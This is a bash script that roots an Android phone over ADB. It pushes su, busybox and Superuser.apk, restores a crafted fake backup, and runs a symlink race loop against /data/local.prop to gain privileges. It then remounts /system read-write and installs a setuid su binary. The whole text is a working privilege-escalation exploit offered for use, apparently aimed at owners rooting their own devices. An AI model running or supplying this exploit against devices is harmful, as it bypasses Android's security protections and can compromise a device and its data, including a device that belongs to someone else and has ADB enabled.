#!/bin/bash
echo "Please connect device with ADB Debugging enabled now...."
./adb wait-for-device
echo "Push busybox"
./adb push busybox /data/local/tmp/
echo "Push su"
./adb push su /data/local/tmp/
echo "Push Superuser,apk"
./adb push Superuser.apk /data/local/tmp/
echo "Applying persmissions to busybox"
./adb shell "chmod 755 /data/local/tmp/busybox"
read -p "Press [Enter] key to start initialise restore..."
./adb restore fakebackup.ab
echo "exploit loaded"
./adb shell "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99; do :; done" >/dev/null
echo "Please look at your device and click Restore"
read -p "Press [Enter]"
echo "Successful, going to reboot your device!"
./adb reboot 
echo "Waiting for device to show up again...."
./adb wait-for-device
echo "Mounting System as rw"
./adb shell "/data/local/tmp/busybox mount -o remount,rw /system"
echo "Imaging su to /system/xbin"
./adb shell "dd if=/data/local/tmp/su of=/system/xbin/su"
echo "Applying permissions to su"
./adb shell "chmod 06755 /system/xbin/su"
echo "Image Superuser.apk to /system/app/"
./adb shell "dd if=/data/local/tmp/Superuser.apk of=/system/app/Superuser.apk"
./adb shell "chmod 655 /system/app/Superuser.apk"
./adb shell "rm /data/local.prop"
./adb shell "sync; sync; sync;"
./adb reboot
echo "You can close all open command-prompts now!"
echo "After reboot all is done! Have fun with Root!"

